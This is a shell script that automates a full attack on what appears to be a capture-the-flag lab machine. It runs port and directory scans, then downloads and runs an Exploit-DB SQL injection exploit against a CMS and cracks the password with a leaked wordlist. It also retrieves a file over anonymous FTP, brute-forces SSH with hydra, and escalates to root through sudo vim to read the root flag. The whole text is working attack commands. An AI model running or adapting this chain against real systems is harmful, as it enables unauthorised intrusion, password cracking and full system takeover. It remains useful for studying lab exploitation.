#/bin/sh

# Retrieve absolute path to this script
script=$(readlink -f $0)
scriptpath=`dirname $script`

# Define target IP ( the machine to attack ) and attack IP ( the machine which supports the attack )
target_ip="10.10.89.50"
attack_ip="10.6.45.13"
result_folder="/media/psf/Home/Work/results/"

# Prepare environment
mkdir $result_folder 2>/dev/null

echo "1 - RECONNAISSANCE"
nmap -p- -Pn -sC -sV -A -sS -T4 ${target_ip} > $result_folder/nmap-results.txt
gobuster dir -u http://$target_ip -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x php,sh,txt,cgi,jpg,png,html,js,css,py -o $result_folder/gobuster-results.txt

echo "2.1 - EXPLOITING CMS VULNERABILITY" 
curl -s -X GET https://www.exploit-db.com/download/46635 -o $result_folder/46635.py
python2 $result_folder/46635.py -u http://$target_ip/simple -w /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt -c > $result_folder/exploit.txt
USER=$(cat $result_folder/exploit.txt | tail -4 | head -n 1 | sed -n 's/.*found: \(.*\).*/\1/p')
echo "--> User is $USER"
PASSWORD=$(cat $result_folder/exploit.txt | tail -1 | sed -n 's/.*cracked: \(.*\).*/\1/p')
echo "--> $USER password is $PASSWORD"

echo "2.2 - EXPLOITING ANONYMOUS FTP"
lftp -u anonymous, ftp://$target_ip -e "set ftp:passive-mode off; set ftp:port-ip $attack_ip; set ftp:port-range 4444-4444; lcd $result_folder; cd pub; get ForMitch.txt; bye"
USER=mitch
echo "--> User is $USER"
hydra -l $USER -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt ssh://${target_ip}:2222 > $result_folder/mitch.txt
PASSWORD=$(cat $result_folder/mitch.txt | sed -n 's/.*password: \(.*\).*/\1/p')
echo "--> $USER password is $PASSWORD"

echo "4 - INTRUSION"
sshpass -p ${PASSWORD} scp -o StrictHostKeyChecking=no -P 2222 ${USER}@${target_ip}:user.txt $result_folder/user.txt
FLAG=$(cat $result_folder/user.txt)
echo "--> User flag is $FLAG"
sshpass -p ${PASSWORD} ssh -o StrictHostKeyChecking=no -p 2222 ${USER}@${target_ip} "ls /home" > $result_folder/others.txt
OTHER=$(cat $result_folder/others.txt | tail -1)
echo "--> The other user is $OTHER"

echo "5 - PRIVILEGE ESCALATION"
sshpass -p $PASSWORD scp -o StrictHostKeyChecking=no -P 2222 $scriptpath/../../tools/LinEnum.sh $USER@$target_ip:/tmp/LinEnum.sh
sshpass -p $PASSWORD ssh -o StrictHostKeyChecking=no -p 2222 $USER@$target_ip "/tmp/LinEnum.sh" > $result_folder/linenum.txt
sshpass -p $PASSWORD ssh -o StrictHostKeyChecking=no -p 2222 $USER@$target_ip "sudo vim -c ':w! /tmp/leaked.txt' -c ':q!' /root/root.txt" > /dev/null 2> /dev/null
sshpass -p $PASSWORD scp -o StrictHostKeyChecking=no -P 2222 $USER@${target_ip}:/tmp/leaked.txt $result_folder/root.txt
FLAG=$(cat $result_folder/root.txt)
echo "--> Root flag is $FLAG"